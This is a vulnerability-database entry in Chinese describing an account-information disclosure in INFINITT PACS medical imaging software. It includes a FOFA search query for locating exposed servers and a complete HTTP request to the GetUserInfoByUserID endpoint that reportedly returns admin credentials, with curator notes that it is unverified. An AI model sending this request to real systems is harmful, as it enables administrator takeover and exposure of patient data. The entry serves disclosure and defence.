---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "INFINITT PACS英飞达 WebUserLogin GetUserInfoByUserID账户信息泄露"
product: "INFINITT PACS英飞达"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，admin账户存在"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%8B%B1%E9%A3%9E%E8%BE%BEPACS/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E8%AE%AF%28PACS%29%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"./scripts/library/bluebird.min.js\""
fofa_unverified: "body="
id: "vw-b9b44222fb0b4ca5773975c3"
entity_id: "ve-b9b44222fb0b4ca5773975c3"
schema_version: "1"
---

# INFINITT PACS英飞达 WebUserLogin GetUserInfoByUserID账户信息泄露

## 条目说明

- 对象与具体问题：INFINITT PACS英飞达；WebUserLogin GetUserInfoByUserID账户信息泄露
- 版本、配置及部署条件：版本未知，admin账户存在
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 从返回可直接登录管理员的关键字段和口令格式只在未视检图，文本缺证明
- bluebird通用库指纹不足定位产品；与519不同SOAP服务功能不能混同漏洞
- 在野已知及补丁信息无公告，HTTP无代码围栏

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

英飞达影像存档与通讯(PACS)系统 /webservices/WebUserLogin.asmx接口处存在信息泄露漏洞，泄露的信息可直接登录管理员权限系统，影响极大。

## 影响版本

英飞达影像存档与通讯(PACS)系统INFINITT PACS

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="./scripts/library/bluebird.min.js"

POC/EXP：

```http
GET /webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```


![image-20241017133331147](./.resource/英飞达影像存档与通讯PACS系统存在信息泄露漏洞/media/image-20241017133331147.png)


![image-20241017133412320](./.resource/英飞达影像存档与通讯PACS系统存在信息泄露漏洞/media/image-20241017133412320.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限。

联系厂家及时打补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
